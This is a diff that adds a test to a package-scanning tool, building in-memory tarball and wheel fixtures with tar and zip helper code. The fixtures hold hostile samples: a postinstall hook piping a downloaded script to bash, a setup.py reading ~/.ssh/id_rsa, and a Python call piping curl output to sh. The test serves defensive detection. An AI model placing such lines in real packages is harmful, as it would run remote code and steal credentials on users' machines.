@@ -1,4 +1,5 @@
-import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
+import { deflateRawSync, gzipSync } from "node:zlib";
+import { mkdir, mkdtemp, readdir, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, test } from "vitest";
@@ -58,4 +59,88 @@ describe("local deep scan", () => {
     expect(parsed.data.report.boundaries.writesWorkspace).toBe(false);
     expect(parsed.data.report.files.matchedManifests).toContain("package.json");
   }, 15_000);
+
+  test("scans supported local package artifacts in memory without extracting files", async () => {
+    const workspace = await mkdtemp(join(tmpdir(), "nipmod-deep-scan-artifact-"));
+    await writeFile(
+      join(workspace, "risk.tgz"),
+      createTarGz({
+        "package/package.json": JSON.stringify({
+          name: "artifact-risk",
+          scripts: {
+            postinstall: "curl https://example.com/install.sh | bash"
+          }
+        }),
+        "package/setup.py": "import os\nos.system('cat ~/.ssh/id_rsa')\n"
+      })
+    );
+    await writeFile(
+      join(workspace, "risk.whl"),
+      createZip({
+        "risk/__init__.py": "import subprocess\nsubprocess.call(['sh', '-c', 'curl https://example.com/a | sh'])\n",
+        "risk-0.1.0.dist-info/METADATA": "Name: risk\nVersion: 0.1.0\n"
+      })
+    );
+
+    const report = await deepScanProject({ path: workspace });
+
+    expect(report.boundaries).toMatchObject({
+      executesCode: false,
+      networkFetch: false,
+      unpacksArtifacts: false,
+      writesWorkspace: false
+    });
+    expect(report.summary.artifactCount).toBe(2);
+    expect(report.summary.artifactEntryCount).toBeGreaterThanOrEqual(4);
+    expect(report.files.matchedManifests).toContain("risk.tgz!package/package.json");
+    expect(report.files.scannedArtifacts.map((artifact) => artifact.type).sort()).toEqual(["tgz", "whl"]);
+    expect(report.findings.map((finding) => finding.category)).toEqual(
+      expect.arrayContaining(["npm-lifecycle-script", "remote-shell", "credential-access", "process-execution"])
+    );
+    await expect(readdir(join(workspace, "package"))).rejects.toThrow();
+    await expect(readdir(join(workspace, "risk"))).rejects.toThrow();
+  });
 });
+
+function createTarGz(files: Record<string, string>): Buffer {
+  const chunks: Buffer[] = [];
+  for (const [name, content] of Object.entries(files)) {
+    const body = Buffer.from(content);
+    const header = Buffer.alloc(512);
+    header.write(name, 0, Math.min(Buffer.byteLength(name), 100), "utf8");
+    header.write("0000777\0", 100, "ascii");
+    header.write("0000000\0", 108, "ascii");
+    header.write("0000000\0", 116, "ascii");
+    header.write(body.length.toString(8).padStart(11, "0") + "\0", 124, "ascii");
+    header.write("00000000000\0", 136, "ascii");
+    header.write("        ", 148, "ascii");
+    header.write("0", 156, "ascii");
+    const checksum = [...header].reduce((sum, byte) => sum + byte, 0);
+    header.write(checksum.toString(8).padStart(6, "0") + "\0 ", 148, "ascii");
+    chunks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
+  }
+  chunks.push(Buffer.alloc(1024));
+  return gzipSync(Buffer.concat(chunks));
+}
+
+function createZip(files: Record<string, string>): Buffer {
+  const chunks: Buffer[] = [];
+  for (const [name, content] of Object.entries(files)) {
+    const nameBuffer = Buffer.from(name);
+    const body = Buffer.from(content);
+    const compressed = deflateRawSync(body);
+    const header = Buffer.alloc(30);
+    header.writeUInt32LE(0x04034b50, 0);
+    header.writeUInt16LE(20, 4);
+    header.writeUInt16LE(0, 6);
+    header.writeUInt16LE(8, 8);
+    header.writeUInt32LE(0, 10);
+    header.writeUInt32LE(0, 14);
+    header.writeUInt32LE(compressed.length, 18);
+    header.writeUInt32LE(body.length, 22);
+    header.writeUInt16LE(nameBuffer.length, 26);
+    header.writeUInt16LE(0, 28);
+    chunks.push(header, nameBuffer, compressed);
+  }
+  return Buffer.concat(chunks);
+}
